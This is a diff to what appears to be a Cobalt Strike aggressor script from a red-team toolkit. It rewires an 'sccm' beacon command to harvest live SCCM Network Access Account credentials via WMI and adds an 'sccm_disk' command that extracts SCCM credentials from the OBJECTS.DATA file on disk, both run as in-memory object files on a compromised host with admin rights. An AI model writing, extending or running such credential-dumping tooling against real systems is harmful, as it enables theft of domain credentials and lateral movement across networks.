@@ -379,15 +379,33 @@ alias sccm {
 
     $data = _load_bof("sccm");
     $args = bof_pack($bid, "z",
-        _str_or_empty(%args["target"])
+        ""
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
 
 beacon_command_register(
     "sccm",
-    "Triage SCCM NAA/task sequence credentials (requires admin)",
-    "Usage: sccm [/target:PATH]"
+    "Triage live SCCM Network Access Account credentials via WMI (CRED-3, requires admin)",
+    "Usage: sccm"
+);
+
+alias sccm_disk {
+    local('%args $data $bid');
+    $bid = $1;
+    %args = _parse_args(substr($0, 10));
+
+    $data = _load_bof("sccm_disk");
+    $args = bof_pack($bid, "z",
+        _str_or_empty(%args["target"])
+    );
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "sccm_disk",
+    "Triage SCCM OBJECTS.DATA credentials from disk (CRED-4, requires admin)",
+    "Usage: sccm_disk [/target:PATH]"
 );
 
 # ============================================================
